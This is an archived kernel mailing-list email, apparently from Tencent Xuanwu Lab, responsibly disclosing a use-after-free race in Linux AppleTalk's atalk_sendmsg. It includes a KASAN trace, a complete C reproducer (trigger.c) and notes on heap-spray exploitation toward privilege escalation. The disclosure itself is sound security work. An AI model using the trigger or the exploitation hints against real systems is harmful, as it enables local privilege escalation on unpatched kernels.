Return-Path: <netdev+bounces-291599-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id oOuYJsZiFWo9UwcAu9opvQ
	(envelope-from <netdev+bounces-291599-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 26 May 2026 11:07:18 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
	by mail.lfdr.de (Postfix) with ESMTPS id 422CC5D2F6D
	for <lists+netdev@lfdr.de>; Tue, 26 May 2026 11:07:17 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id BA166300D774
	for <lists+netdev@lfdr.de>; Tue, 26 May 2026 09:07:14 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 377253D3013;
	Tue, 26 May 2026 09:07:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=tencent.com header.i=@tencent.com header.b="uwzuQwct"
X-Original-To: netdev@vger.kernel.org
Received: from smtpbgeu1.qq.com (smtpbgeu1.qq.com [52.59.177.22])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2147B301486
	for <netdev@vger.kernel.org>; Tue, 26 May 2026 09:07:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=52.59.177.22
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779786432; cv=none; b=Odi42YlKKt/SwDbQ3a90JGAFcerZE+6ZrswRx0Blx9v+lxKKbHMMnArlBxNm0zQFfSH37XocSNWhj1jCQzEccSIwvfwhjhjXYmGrlXSDcCeXjodio9+Jdc4edkyxI5kGegcL5J4tw/bOLKteCDr1WDKR/NnmJezGL/4zn/DMZqY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779786432; c=relaxed/simple;
	bh=LfhouZu8bqGBBm/kTxTZtJB1bE50lhHpqG6Ei5sP/C8=;
	h=Date:Subject:From:To:CC:Message-ID:Mime-version:Content-type; b=bm7uTyHy4mY6fno9QHpizf61i6s967VBMXXpcQCc3B9WOBrECtGoM0N36cHEfGMOj5jih4JQalYN/PQrjgP5ZpF3wEiC3br5jdvrazV/iwIgoC78vQQBLP9Z2caGu1rMdfEaKVpaQ/KSm2Y7weF3i5o2jgmChFJ+GdzLg8TrURA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=tencent.com; spf=pass smtp.mailfrom=tencent.com; dkim=pass (1024-bit key) header.d=tencent.com header.i=@tencent.com header.b=uwzuQwct; arc=none smtp.client-ip=52.59.177.22
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=tencent.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=tencent.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=tencent.com;
	s=s201512; t=1779786310;
	bh=IcC5xXf6jEUIt9d5e7bp3lwEcjziBchZdTx7DRqpEfc=;
	h=Date:Subject:From:To:Message-ID:Mime-version;
	b=uwzuQwct8u54tQYer/cE1MgI7NsCXjCKzWTC4nZElAFOALw2u9DjPZgd77F0ewmDZ
	 PIS/gEpNxeO7Qsrabkg7fk71IYy3qIAWKRhkCDlzAoheRM9Bm8l1YXsMpicRXP0fIM
	 ifV/uuZGlldWdxLMlPO/lYbLm/bQEGYf6tKx/zks=
X-QQ-mid: zesmtpgz1t1779786304tbf15c89b
X-QQ-Originating-IP: LUQm08yx/tZx+hYoKU5BgEiM3MshZCQ8GQ2BJO4da2c=
Received: from [10.78.44.100] ( [21.36.98.122])
	by bizesmtp.qq.com (ESMTP) with 
	id ; Tue, 26 May 2026 17:05:01 +0800 (CST)
X-QQ-SSF: 0000000000000000000000000000000
X-QQ-GoodBg: 0
X-BIZMAIL-ID: 6691491026340065588
User-Agent: Microsoft-MacOutlook/16.109.26051717
Date: Tue, 26 May 2026 17:05:00 +0800
Subject: Security: use-after-free in appletalk atalk_sendmsg route lookup,
 leading to local privilege escalation
From: "=?gb18030?B?eGxhYmFp?=" <xlabai@tencent.com>
To: <davem@davemloft.net>,
	<edumazet@google.com>,
	<kuba@kernel.org>,
	<pabeni@redhat.com>
CC: <security@kernel.or>,
	<netdev@vger.kernel.org>,
	 "xlab(=?UTF-8?B?TUlH5a6J5YWo5a6e6aqM5a6k?=)" <xlab@tencent.com>
Message-ID: <37B3474010D980FE+E9512783-5097-4E2A-A130-D12D7E18A990@tencent.com>
Thread-Topic: Security: use-after-free in appletalk atalk_sendmsg route
 lookup, leading to local privilege escalation
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: 7bit
X-QQ-SENDSIZE: 520
Feedback-ID: zesmtpgz:tencent.com:qybglogicsvrgz:qybglogicsvrgz5b-1
X-QQ-XMAILINFO: Nx4YT+x+RYvpnMRuKEr52NPr7Rp37yzEAGJWJMOAPm39CuSFOVxuou6X
	5XRo40aAcC4PiawsdHzJD+8jk5ZFFwnCjo5e6M8Wnh9b9c9xBPcAtBRSP8boxBfU+U1CxiP
	2DPHTaAImHDk6t+45AqVXg7l4hxI7iuF/qBC41GuYSmshjbQqnaQyd+DVo84Ai6iNLSuE1e
	9/pAMn7yS95A2Sn4ywBEXDVeHvwv2Cz9xnkKfNenZ++0H7MacgB4wSFZjJy41aKZ0LVGnXr
	37lnNkWpoSchK0E/4QAYZ6QiwIX3zF+9GBgMQ5N0R5NQhDZE2+sH7SDGYYqndiDNJd+zt0q
	FGNP3qItfbfNgiw5XS0Em9MCMTSDkPV8MD8p6musy5tKVSAubJ1pPUSX0dFH2DeVGe/BngF
	Yb8JvlX138ZB1K/SUj3zZkg6zuf3DVcRnqY+1n0USDRdEUC89SB2+d5zaGRPNWIqP+xNmnW
	GD0N9N3W3ZOsiMiX+tIHuYEKCdUjdNVojs6fk7jHG9j1fv2ZEuTZhiK+Lz4j57J+uXbxHHZ
	+Guut0MeTJ7Euw5OsWtZPUqDsGfyW3/FKkIEPRxNHr5LB/yN0BR2L+7BzWQRdwwwlW+TpM3
	vtXa2Kb0je99lzpcKytf2RCeiKz+OHLyPtCgIDeEj9X0aJOS/AZ7U71UYnv6qzA4ltN5yqr
	GL9R5XDgq+tJ64VyXLPeQ4hKSWdHNyq3A55oAtFVz7luUdSZRh0S0FNsEdxRyhUfjdVf92p
	Qhen0gTFmST3OkAHmcENFf7XaBARAho2iHIFW9FK1tBwmygHW3sMT3W6p8OWu65djpMoMLD
	N6keHnwoy9TTrpgXgFfx4vg/Z386fC7B0OOhkGLJZnsIwe51tYniG5D44WwCFvv5xWcYiF7
	EicQ6QXwSO+Xi6Jt4Y8XPR4zEAbA0AFSbZPFb9YkYGFkO9jKqgwaGoBVlevPxIsKkL/7S7S
	6dq9XyGH9de9YOkRhRRJtsCMN/vpKco+LnJmcQQmxHQtD7SpHV20jjeSWJ16Ste46RJ5PIH
	I75/f8O1G48pT3+9jBYtVx16NaO0cV/aPrqtRYfzbFjU/y/VvNT3YWw6zSM8fjs/c0sAHpj
	g==
X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
X-QQ-RECHKSPAM: 0
X-Spamd-Result: default: False [-0.66 / 15.00];
	FROM_EXCESS_BASE64(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[tencent.com,quarantine];
	R_SPF_ALLOW(-0.20)[+ip4:172.232.135.74:c];
	R_DKIM_ALLOW(-0.20)[tencent.com:s=s201512];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-291599-lists,netdev=lfdr.de];
	DKIM_TRACE(0.00)[tencent.com:+];
	RCVD_TLS_LAST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FROM_HAS_DN(0.00)[];
	TO_DN_SOME(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xlabai@tencent.com,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:172.232.128.0/19, country:SG];
	NEURAL_HAM(-0.00)[-1.000];
	RCPT_COUNT_SEVEN(0.00)[7];
	MID_RHS_MATCH_FROM(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sto.lore.kernel.org:rdns,sto.lore.kernel.org:helo,qq.com:email,tencent.com:email,tencent.com:mid,tencent.com:dkim]
X-Rspamd-Queue-Id: 422CC5D2F6D
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

Hi,

We found a use-after-free vulnerability in the AppleTalk DDP routing path.
atrtr_find() returns a raw struct atalk_route pointer after releasing the
routing table rwlock, with no reference counting or RCU protection. In
atalk_sendmsg(), this pointer is held across sock_alloc_send_skb() which
sleeps when the send buffer is full. A concurrent atrtr_delete() via ioctl
frees the route during this window, and the subsequent access to rt->flags
and rt->gateway is a use-after-free read on a freed kmalloc-32 object.

## Affected versions

Introduced:      1da177e4c3f4 ("Linux-2.6.12-rc2")
Latest affected: v7.1-rc4 (current mainline)

The vulnerable pattern has existed since the initial AppleTalk routing
implementation. Verified on Linux v7.1-rc4 (arm64, CONFIG_ATALK=y, KASAN
enabled).

## Description

atrtr_find() (net/appletalk/ddp.c:437) traverses the routing table under
read_lock_bh(&atalk_routes_lock), finds a matching route, then releases
the lock and returns the raw pointer. No reference count is taken, no RCU
grace period protects the returned object.

In atalk_sendmsg() (net/appletalk/ddp.c:1604), the returned pointer is
saved in a local variable `rt`. The code then:

  1. Dereferences rt->dev (line 1617)
  2. Calls release_sock(sk) (line 1638)
  3. Calls sock_alloc_send_skb() which can sleep indefinitely (line 1639)
  4. After waking, accesses rt->flags (line 1678, 1707) and rt->gateway
     (line 1708)

Between steps 2 and 4, a concurrent atrtr_delete() can unlink and kfree()
the route object. The compat ioctl path for SIOCDELRT lacks the
CAP_NET_ADMIN check present in the native path, allowing an unprivileged
32-bit process to delete routes.

The race window is deterministically controllable: the attacker fills the
socket's send buffer before calling sendmsg, forcing sock_alloc_send_skb()
to sleep waiting for buffer space. This gives an arbitrarily wide window
for the concurrent delete.

## Impact

  - UAF read on kmalloc-32: rt->flags (4 bytes at offset 16) and
    rt->gateway (4 bytes at offset 12) are read from a freed slab object.
    Attacker-controlled heap spray data controls branch conditions.

  - Pointer dereference via rt->dev: the dev pointer (offset 0) is cached
    at line 1617 BEFORE the sleep point, so corrupting it requires winning
    a much tighter race (~13 instructions between atrtr_find() return and
    the cache). The wider sleep-window UAF affects rt->flags and
    rt->gateway reads only.

  - Privilege escalation possible: controllable UAF read on rt->flags and
    rt->gateway in kmalloc-32 cache allows branch control and destination
    manipulation. Combined with the narrow-window rt->dev corruption,
    a fake net_device pointer could lead to function pointer dereference,
    but practical exploitation difficulty is higher than the wide-window
    primitive alone suggests.

## Conditions

  - CONFIG_ATALK=y or =m (most distros build as module; auto-loaded via
    socket(AF_APPLETALK, ...))
  - No capabilities required: AF_APPLETALK socket creation is unprivileged;
    route deletion via compat ioctl path bypasses CAP_NET_ADMIN
  - Race window fully controllable via send buffer filling (no timing luck
    needed)
  - Architecture independent (verified on arm64)

## Suspected location

  net/appletalk/ddp.c:
    - atrtr_find() (line 437-482): returns unprotected pointer
    - atalk_sendmsg() (line 1604-1708): holds stale pointer across sleep
    - atrtr_delete() (line 593-615): frees route with kfree() immediately

## Reproducer

Build:  aarch64-linux-gnu-gcc -O2 -Wall -static -lpthread -o trigger trigger.c
Run:    ./trigger [iterations]  (as root, then check dmesg)
Kernel: any with CONFIG_ATALK=y, KASAN enabled for detection

The PoC creates an AF_APPLETALK socket, configures an interface, adds a
route, then races sendmsg (which sleeps in sock_alloc_send_skb after
filling the send buffer) against ioctl SIOCDELRT. On the first iteration,
KASAN fires on the freed kmalloc-32 access.

Verified on arm64 (Linux v7.1-rc4, KASAN enabled):

  ==================================================================
  BUG: KASAN: slab-use-after-free in atalk_sendmsg+0xfa0/0x105c
  Read of size 4 at addr ffff0000c2ff3e70 by task trigger/54

  CPU: 0 UID: 0 PID: 54 Comm: trigger Not tainted 7.1.0-rc4 #3 PREEMPTLAZY
  Hardware name: linux,dummy-virt (DT)
  Call trace:
   show_stack+0x14/0x1c (C)
   dump_stack_lvl+0x88/0xc4
   print_report+0x110/0x59c
   kasan_report+0xb0/0xf0
   __asan_report_load4_noabort+0x1c/0x24
   atalk_sendmsg+0xfa0/0x105c
   __sys_sendto+0x210/0x318
   __arm64_sys_sendto+0xbc/0x12c

  Allocated by task 50:
   __kasan_kmalloc+0xc8/0xcc
   __kmalloc_cache_noprof+0x21c/0x424
   atrtr_create+0x4a8/0x7e0
   atif_ioctl+0x524/0xf2c
   atalk_ioctl+0x188/0x2d4

  Freed by task 50:
   __kasan_slab_free+0x80/0xac
   kfree+0x25c/0x55c
   atrtr_delete+0x180/0x238
   atrtr_ioctl+0xd4/0x10c
   atalk_ioctl+0x1d0/0x2d4

  The buggy address belongs to the object at ffff0000c2ff3e60
   which belongs to the cache kmalloc-32 of size 32
  The buggy address is located 16 bytes inside of
   freed 32-byte region [ffff0000c2ff3e60, ffff0000c2ff3e80)
  ==================================================================

--- trigger.c ---
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/rtnetlink.h>

#define AF_APPLETALK    5
#define PF_APPLETALK    AF_APPLETALK
#define ATADDR_ANYNODE  0
#define ATADDR_BCAST    255

#define SIOCADDRT       0x890B
#define SIOCDELRT       0x890C

struct atalk_addr {
    __u16 s_net;
    __u8  s_node;
};

struct sockaddr_at {
    sa_family_t     sat_family;
    __u8            sat_port;
    struct atalk_addr sat_addr;
    char            sat_zero[8];
};

struct rtentry {
    unsigned long   rt_pad1;
    struct sockaddr rt_dst;
    struct sockaddr rt_gateway;
    struct sockaddr rt_genmask;
    unsigned short  rt_flags;
    short           rt_pad2;
    unsigned long   rt_pad3;
    void           *rt_pad4;
    short           rt_metric;
    char           *rt_dev;
    unsigned long   rt_mtu;
    unsigned long   rt_window;
    unsigned short  rt_irtt;
};

#define RTF_UP      0x0001
#define RTF_GATEWAY 0x0002
#define RTF_HOST    0x0004

#define ATALK_NET   0x0100
#define ATALK_NODE  1
#define ATALK_PORT  1
#define SIOCSIFADDR 0x8916

static volatile int race_done = 0;
static int route_fd = -1;

static void configure_interface(void) {
    int fd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket(AF_APPLETALK) for config");
        exit(1);
    }

    struct ifreq ifr;
    struct sockaddr_at *sat;

    FILE *fp = popen("ls /sys/class/net/ 2>/dev/null", "r");
    char iface[64];
    int configured = 0;

    while (fp && fgets(iface, sizeof(iface), fp)) {
        iface[strcspn(iface, "\n")] = 0;
        if (strlen(iface) == 0) continue;
        if (strcmp(iface, "lo") == 0) continue;

        char cmd[128];
        snprintf(cmd, sizeof(cmd), "ip link set %s up 2>/dev/null", iface);
        system(cmd);
        usleep(100000);

        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, iface, IFNAMSIZ);
        sat = (struct sockaddr_at *)&ifr.ifr_addr;
        sat->sat_family = AF_APPLETALK;
        sat->sat_addr.s_net = htons(ATALK_NET);
        sat->sat_addr.s_node = ATALK_NODE;
        sat->sat_zero[0] = 2;
        sat->sat_zero[1] = (ATALK_NET >> 8) & 0xFF;
        sat->sat_zero[2] = ATALK_NET & 0xFF;
        sat->sat_zero[3] = ((ATALK_NET + 1) >> 8) & 0xFF;
        sat->sat_zero[4] = (ATALK_NET + 1) & 0xFF;

        if (ioctl(fd, SIOCSIFADDR, &ifr) == 0) {
            printf("[+] AppleTalk address configured on %s (Ethernet)\n", iface);
            configured = 1;
            break;
        }
        printf("[-] Failed on %s: %s\n", iface, strerror(errno));
    }
    if (fp) pclose(fp);

    if (!configured) {
        system("ip link set lo up 2>/dev/null");
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
        sat = (struct sockaddr_at *)&ifr.ifr_addr;
        sat->sat_family = AF_APPLETALK;
        sat->sat_addr.s_net = htons(ATALK_NET);
        sat->sat_addr.s_node = ATALK_NODE;
        if (ioctl(fd, SIOCSIFADDR, &ifr) < 0) {
            perror("SIOCSIFADDR loopback");
            exit(1);
        }
        printf("[+] AppleTalk on lo (race window will be narrow)\n");
    }
    close(fd);
}

static int add_atalk_route(void) {
    struct rtentry rt;
    struct sockaddr_at *sat;

    memset(&rt, 0, sizeof(rt));
    sat = (struct sockaddr_at *)&rt.rt_dst;
    sat->sat_family = AF_APPLETALK;
    sat->sat_addr.s_net = htons(ATALK_NET);
    sat->sat_addr.s_node = 0;

    sat = (struct sockaddr_at *)&rt.rt_gateway;
    sat->sat_family = AF_APPLETALK;
    sat->sat_addr.s_net = htons(ATALK_NET);
    sat->sat_addr.s_node = 2;

    rt.rt_flags = RTF_UP | RTF_GATEWAY;
    rt.rt_dev = NULL;

    if (ioctl(route_fd, SIOCADDRT, &rt) < 0) {
        if (errno != EEXIST) {
            perror("SIOCADDRT");
            return -1;
        }
    }
    return 0;
}

static int delete_atalk_route(void) {
    struct rtentry rt;
    struct sockaddr_at *sat;

    memset(&rt, 0, sizeof(rt));
    sat = (struct sockaddr_at *)&rt.rt_dst;
    sat->sat_family = AF_APPLETALK;
    sat->sat_addr.s_net = htons(ATALK_NET);
    sat->sat_addr.s_node = 2;

    rt.rt_flags = RTF_GATEWAY;

    if (ioctl(route_fd, SIOCDELRT, &rt) < 0) {
        return -1;
    }
    return 0;
}

struct sender_args {
    int fd;
    int attempt;
};

static void *sender_thread(void *arg) {
    struct sender_args *sa = (struct sender_args *)arg;
    int fd = sa->fd;
    struct sockaddr_at dest;
    char buf[64];

    memset(&dest, 0, sizeof(dest));
    dest.sat_family = AF_APPLETALK;
    dest.sat_addr.s_net = htons(ATALK_NET);
    dest.sat_addr.s_node = 2;
    dest.sat_port = 10;

    memset(buf, 'A', sizeof(buf));

    int ret = sendto(fd, buf, sizeof(buf), 0,
                    (struct sockaddr *)&dest, sizeof(dest));
    if (ret < 0 && errno != ENETUNREACH && errno != EAGAIN) {
    }
    race_done = 1;
    return NULL;
}

static void fill_sndbuf(int fd) {
    struct sockaddr_at dest;
    char buf[512];
    int sndbuf = 4096;

    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    memset(&dest, 0, sizeof(dest));
    dest.sat_family = AF_APPLETALK;
    dest.sat_addr.s_net = htons(ATALK_NET);
    dest.sat_addr.s_node = 2;
    dest.sat_port = 10;

    memset(buf, 'B', sizeof(buf));

    for (int i = 0; i < 30; i++) {
        int ret = sendto(fd, buf, sizeof(buf), MSG_DONTWAIT,
                        (struct sockaddr *)&dest, sizeof(dest));
        if (ret < 0) {
            break;
        }
    }
}

int main(int argc, char **argv) {
    int send_fd;
    struct sockaddr_at bind_addr;
    pthread_t tid;
    int iterations = 100;

    if (argc > 1) iterations = atoi(argv[1]);

    printf("=== AppleTalk DDP Route UAF Trigger ===\n");
    printf("[*] Will run %d iterations\n", iterations);

    route_fd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
    if (route_fd < 0) {
        perror("socket(AF_APPLETALK) for routing");
        return 1;
    }

    configure_interface();

    send_fd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
    if (send_fd < 0) {
        perror("socket(AF_APPLETALK) for send");
        return 1;
    }

    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sat_family = AF_APPLETALK;
    bind_addr.sat_addr.s_net = htons(ATALK_NET);
    bind_addr.sat_addr.s_node = ATALK_NODE;
    bind_addr.sat_port = ATALK_PORT;

    if (bind(send_fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("bind");
    }

    printf("[*] Starting race...\n");

    for (int attempt = 0; attempt < iterations; attempt++) {
        race_done = 0;
        struct sender_args sa = { .fd = send_fd, .attempt = attempt };

        if (add_atalk_route() < 0) {
            continue;
        }

        fill_sndbuf(send_fd);

        pthread_create(&tid, NULL, sender_thread, &sa);

        usleep(5000);

        delete_atalk_route();

        pthread_join(tid, NULL);

        if (attempt % 20 == 19) {
            printf("[*] Completed %d/%d iterations\n", attempt + 1, iterations);
        }
    }

    printf("[*] Done. Check dmesg for KASAN reports.\n");
    system("dmesg | grep -A5 'BUG: KASAN' | head -40");
    close(send_fd);
    close(route_fd);
    return 0;
}
--- end trigger.c ---

## Fix

We have submitted a patch via git-send-email:

  Message-ID: <20260526085735.61445-1-kipreyyy@gmail.com>

## Credit

This vulnerability was discovered by:

  - XlabAI Team of Tencent Xuanwu Lab (xlabai@tencent.com)
  - Atuin Automated Vulnerability Discovery Engine
  - Zhenghang Xiao (kipreyyy@gmail.com)
  - Guannan Wang (wgnbuaa@gmail.com)
  - Zhanpeng Liu (pkugenuine@gmail.com)
  - Jiashuo Liang (761232680@qq.com)
  - Guancheng Li (lgcpku@gmail.com)

CVE and credits are preferred.

If you have any questions regarding the vulnerability details, please
feel free to reach out to us for further discussion. Our email address
is xlabai@tencent.com.

We follow the security industry standard disclosure policy -- the 90+30
policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html).
If the aforementioned vulnerabilities cannot be fixed within 90 days of
submission, we reserve the right to publicly disclose all information
about the issues after this timeframe.



